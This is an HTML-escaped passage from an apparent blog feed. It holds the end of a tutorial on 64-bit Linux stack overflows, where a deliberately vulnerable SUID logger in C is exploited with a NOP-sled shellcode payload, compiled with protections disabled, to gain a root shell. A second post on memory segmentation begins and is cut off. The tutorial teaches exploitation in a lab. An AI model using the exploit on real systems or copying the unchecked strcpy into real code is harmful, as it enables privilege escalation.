    &lt;h1 id=&quot;suid-log-program&quot;&gt;SUID Log Program&lt;br /&gt;&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Please provide &apos;read&apos; or &apos;write&apos; as an argument to declare the mode.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;vuln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
  &lt;span class=&quot;n&quot;&gt;setuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;read&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/root/root_log.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;root_log.txt is missing!&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Reading root_log.txt: &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;feof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)){&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;write&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;FILE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fopen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/root/root_log.txt&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Writing to root_log.txt&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;scanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%495s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This program manipulates a file named &lt;strong&gt;root_log.txt&lt;/strong&gt; which is located in the root’s home directory.
With this logger program, a user can write a new log entry or read the entries logged before. However,
in order for any user to use this functionality, the compiled binary must have an SUID bit set.&lt;/p&gt;

&lt;p&gt;So let’s log-in as root, compile the source code, and set the SUID bit.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@archlinux reverse]# gcc &lt;span class=&quot;nt&quot;&gt;-no-pie&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; stackBasedSimple.c &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; stackBasedSimple.elf &lt;span class=&quot;nt&quot;&gt;-D_FORTIFY_SOURCE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0 &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; execstack
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@archlinux reverse]# &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +s ./stackBasedSimple.elf
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@archlinux reverse]# &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; stackBasedSimple.elf
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt; 1 root root 22896 Dec 26 02:57 stackBasedSimple.elf
&lt;span class=&quot;c&quot;&gt;#  | that is the SUID bit.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Note that when we try to access to that file manually, we are denied since we do not have the permission.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /root/root_log.txt
&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: /root/root_log.txt: Permission denied
KnuckleSecurity :: -&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let’s try to modify that file with the SUID program.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;KnuckleSecurity :: -&amp;gt; ./stackBased.elf
Please provide &lt;span class=&quot;s1&quot;&gt;&apos;read&apos;&lt;/span&gt; or &lt;span class=&quot;s1&quot;&gt;&apos;write&apos;&lt;/span&gt; as an argument to &lt;span class=&quot;nb&quot;&gt;declare &lt;/span&gt;the mode.
KnuckleSecurity :: -&amp;gt; ./stackBased.elf write
Writing to root_log.txt&amp;gt; log1
KnuckleSecurity :: -&amp;gt; ./stackBased.elf write
Writing to root_log.txt&amp;gt; log2
KnuckleSecurity :: -&amp;gt; ./stackBased.elf write
Writing to root_log.txt&amp;gt; KnuckleSecurity
KnuckleSecurity :: -&amp;gt; ./stackBased.elf &lt;span class=&quot;nb&quot;&gt;read
&lt;/span&gt;Reading root_log.txt:

log1
log2
KnuckleSecurity%&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It works. However, if you look at to the source code, we have the same vulnerability. Again, the first command line 
argument is being copied into a buffer to select the ‘read’ or ‘write’ mode. But still, no border checks. It is 
exactly the same as the previous demo. So let’s quickly drop a root shell and escalate our system priveleges
by exploiting this poor logger program.&lt;/p&gt;

&lt;p&gt;Calculate the offset.
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/27.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;
It is 288.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-shell&quot; data-lang=&quot;shell&quot;&gt;r &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;perl &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;print &quot;\x90&quot;x288&apos;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;BBBBBBBBZZZZZZ&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/28.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, find an address in the NOP slide.
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/29.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;
Let’s use the 0xfe3c0&lt;/p&gt;

&lt;p&gt;I will use the same python code with two tweaks.&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Change the offset.&lt;/li&gt;
  &lt;li&gt;Change the RET address.&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;288&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rbp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc0\xe3\xff\xff\xff\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Time to test it.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;n&quot;&gt;KnuckleSecurity&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;::&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stackBased&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;elf&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;python&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stackBased&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;5.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;5.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;984&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;984&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;969&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libvirt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;998&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wheel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Sweet taste of the victory ;)&lt;/p&gt;

&lt;h1 id=&quot;bibliography&quot;&gt;Bibliography&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Function_prologue_and_epilogue&quot;&gt;&lt;strong&gt;wikipedia.com-Function Prologue and Epilogue&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.felixcloutier.com/x86/leave&quot;&gt;&lt;strong&gt;feliclouiter.com-Leave&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://valsamaras.medium.com/introduction-to-x64-linux-binary-exploitation-part-1-14ad4a27aeef&quot;&gt;&lt;strong&gt;valsamaras.medium.com-Introduction to X64 Binary Exploitation Part-1&lt;/strong&gt;&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.amazon.co.uk/Practical-Reverse-Engineering-Reversing-Obfuscation/dp/1118787315&quot;&gt;&lt;strong&gt;Book-Practical Reverse Engineering&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.amazon.co.uk/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441&quot;&gt;&lt;strong&gt;Book-Hacking: The Art Of Exploitation&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Memory_hierarchy&quot;&gt;&lt;strong&gt;wikipedia.com-Memory Hierarchy&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Assembly_language&quot;&gt;&lt;strong&gt;wikipedia.com-Assembly Language&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64&quot;&gt;&lt;strong&gt;eli.thegreenplace.net-Stack Frame Layout on x86_64&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.techtarget.com/whatis/definition/register&quot;&gt;&lt;strong&gt;techtarget.com-What is Definition Register&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;http://ref.x86asm.net/coder64.html&quot;&gt;&lt;strong&gt;ref.x86asm.net-Coder64&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://www.isss.io/resources&quot;&gt;&lt;strong&gt;isss.io-Resource&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://ctf101.org/binary-exploitation/overview/&quot;&gt;&lt;strong&gt;ctf101.org-Binary Exploitation Overview&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Calling_convention#x86-64&quot;&gt;&lt;strong&gt;wikipedia-Calling Convention x86_64&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sat, 10 Dec 2022 22:20:00 +0000</pubDate>
        <link>http://localhost:4000/2022/12/10/stack-based-overflows-on-64bit-linux/</link>
        <guid isPermaLink="true">http://localhost:4000/2022/12/10/stack-based-overflows-on-64bit-linux/</guid>
        
        <category>c</category>
        
        <category>assembly</category>
        
        <category>x86</category>
        
        <category>32-bit</category>
        
        <category>memory-segmentation</category>
        
        <category>memory-segmentation</category>
        
        <category>buffer-overflows</category>
        
        
      </item>
    
      <item>
        <title>Memory Segmentation</title>
        <description>&lt;h1 id=&quot;what-is-ram&quot;&gt;What is RAM?&lt;/h1&gt;
&lt;p&gt;Random-access memory is a form of computer memory that can be read and changed in any order,
typically used to store working data and machine code.&lt;/p&gt;

&lt;h1 id=&quot;memory-segmentation&quot;&gt;Memory Segmentation&lt;/h1&gt;

&lt;p&gt;When a program is compiled and run, memory is divided into five segments: stack, heap, data, bss and text.
Each segment of the memory serves a certain purpose. The &lt;strong&gt;text&lt;/strong&gt; segment is also called &lt;strong&gt;code&lt;/strong&gt; segment.
This segment contains the compiled program’s assembled machine code instructions to be read by the CPU.
